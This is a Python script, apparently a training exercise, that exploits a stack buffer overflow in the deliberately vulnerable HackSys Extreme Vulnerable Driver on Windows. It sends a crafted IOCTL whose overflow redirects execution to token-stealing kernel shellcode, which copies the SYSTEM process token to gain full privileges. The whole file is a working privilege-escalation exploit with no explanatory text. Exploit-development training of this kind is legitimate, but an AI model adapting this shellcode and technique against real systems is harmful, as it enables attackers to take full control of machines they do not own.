import ctypes, sys, struct
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFile("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None)

if not hevDevice or hevDevice == -1:
	print("*** Couldn't get Device Driver Handle")
	sys.exit(0)

shellcode = ""
shellcode += bytearray(
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad	
    )
 
ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))
shellcode_final = struct.pack('<L', ptr)

buf = "A" * 2080 + shellcode_final
bufLength = len(buf)

kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)